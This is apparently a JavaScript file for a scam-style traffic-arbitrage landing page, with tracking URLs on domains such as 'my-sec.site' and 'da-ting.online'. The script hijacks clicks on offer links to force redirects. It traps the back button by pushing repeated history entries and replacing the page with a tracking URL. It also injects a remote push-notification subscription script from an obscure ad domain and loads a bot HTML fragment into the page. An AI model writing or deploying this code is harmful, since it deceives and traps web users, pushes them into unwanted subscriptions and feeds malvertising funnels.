const offer_403 = 'https://t.my-sec.site/c6yfl5k.php?lp=1'; 
const under_offer = null;  // 初始化为 null，表示未设置
const backURL = 'https://t.da-ting.online/c6yfl5k.php?key=a3qxs34y004y1sjqf89k&lander={lander}&geo={geo}&Camp_ID={camp_id}'; 
//https://t.top10sec.online/c6yfl5k.php?key=a3qxs34y004y1sjqf89k&lander={lander}&geo={geo}&Camp_ID={camp_id}

// offer clicks code 👇👇👇👇
document.addEventListener('DOMContentLoaded', () => {
    const links = document.querySelectorAll('a[href="{offer_link}"]');
    links.forEach(link => {
        link.addEventListener('click', async event => {
            event.preventDefault(); 
            if (under_offer && under_offer!== '') {  // 如果 under_offer 有值且不为空
                window.open(under_offer, '_blank'); 
            }
            await new Promise(resolve => setTimeout(resolve, 100));  // 稍作延迟，确保新窗口打开
            window.location.href = offer_403;  // 始终执行
        });
    });
});

// back button script 👇👇👇👇
if (backURL) {
    try { 
        const currentUrl = window.location.href.split(/[#]/)[0];
        for (let t = 0; t < 10; t++) {
            history.pushState({}, "", currentUrl + "#"); 
        }

        window.addEventListener('popstate', event => {
            window.onbeforeunload = null;
            if (event.state) {
                location.replace(backURL);
            }
        });
    } catch (o) { 
        console.log(o); 
    }
}

// offer propush code
// var s = document.createElement('script');
// s.src='//coohauwhob.net/act/files/micro.tag.min.js?z=7612376'+'&sw=/sw-check-permissions-e5ce4.js';
// s.onload = function(result) {
//     switch (result) {
//         case 'onPermissionDefault':break;
//         case 'onPermissionAllowed':break;
//         case 'onPermissionDenied':break;
//         case 'onAlreadySubscribed':break;
//         case 'onNotificationUnsupported':break;
//     }
// };
// document.head.appendChild(s);

    var url = new URL(window.location.href);
    var pci = url.searchParams.get('cnv_id');
    var s = document.createElement('script');
    s.src='//coohauwhob.net/act/files/micro.tag.min.js?z=7612376'+'&ymid='+pci+'&sw=/sw-check-permissions-e5ce4.js';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':break;
            case 'onPermissionAllowed':break;
            case 'onPermissionDenied':break;
            case 'onAlreadySubscribed':break;
            case 'onNotificationUnsupported':break;
        }
    };
    document.head.appendChild(s);

// bot html clicks 👇👇👇👇
function loadHTML(url) {
    fetch(url)
        .then(response => response.text())
        .then(data => {
            var div = document.createElement('div');
            div.innerHTML = data;
            document.body.appendChild(div);
        })
        .catch(error => console.error('error:', error));
}

loadHTML('/call/bot.html');